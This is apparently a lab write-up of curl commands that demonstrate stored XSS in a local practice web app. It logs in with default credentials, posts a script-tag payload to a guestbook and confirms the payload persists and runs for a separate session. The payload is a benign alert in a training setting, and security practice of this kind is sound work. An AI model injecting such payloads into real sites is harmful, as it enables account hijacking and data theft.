# Commands — XSS (Stored) Lab

## 1. Authenticate and establish session

```bash
curl -c cookies.txt -s http://localhost:4280/login.php -o login.html
TOKEN=$(grep -oP "user_token' value='\K[^']+" login.html)

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  -o login_result.html

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/security.php \
  -d "security=low&seclev_submit=Submit" -o security_result.html
```

## 2. Inspect guestbook form structure

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/xss_s/" -o xss_s_baseline.html
grep -A20 "vulnerable_code_area" xss_s_baseline.html
```

**Result:** Standard POST form with `txtName` and `mtxMessage` fields, `maxlength` attributes present on both (client-side only — no server-side length or content enforcement observed).

## 3. Submit the stored XSS payload

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/xss_s/" \
  -d "txtName=Tester&mtxMessage=<script>alert('Stored XSS')</script>&btnSign=Sign+Guestbook" \
  -o xss_s_submit_result.html
```

## 4. Confirm the payload persisted in the same session

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/xss_s/" -o xss_s_after_submit.html
grep -B2 -A2 "script" xss_s_after_submit.html
```

**Result:**
```html
<div id="guestbook_comments">Name: Tester<br />Message: <script>alert('Stored XSS')</script><br /></div>
```

## 5. Confirm persistence across a completely separate, fresh login session

This is the critical test for stored XSS: does the payload appear for a session that never submitted it?

```bash
rm -f cookies2.txt

curl -c cookies2.txt -s http://localhost:4280/login.php -o login2.html
TOKEN2=$(grep -oP "user_token' value='\K[^']+" login2.html)

curl -b cookies2.txt -c cookies2.txt -s http://localhost:4280/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN2" \
  -o login2_result.html

# Brand new session — never touched the guestbook form
curl -b cookies2.txt -s "http://localhost:4280/vulnerabilities/xss_s/" -o xss_s_new_session.html
grep "Stored XSS" xss_s_new_session.html
```

**Result:**
```html
<div id="guestbook_comments">Name: Tester<br />Message: <script>alert('Stored XSS')</script><br /></div>
```

Confirmed: the payload is served identically to a session that had no involvement in submitting it, proving true server-side persistence rather than a session-scoped artifact.

## 6. Trigger and observe execution in browser (fresh private/incognito session)

Opened a new Private Browsing window, logged in fresh with `admin`/`password`, and navigated directly to:
```
http://localhost:4280/vulnerabilities/xss_s/
```

**Result:** The alert fired **immediately on page load**, with no payload present anywhere in the URL and no form ever submitted in this session — see `screenshots/01-stored-xss-popup.png`. Viewing page source (`view-source:http://localhost:4280/vulnerabilities/xss_s/`) confirmed the raw `<script>` tag embedded directly alongside legitimate guestbook entries — see `screenshots/02-stored-xss-source-view.png`.
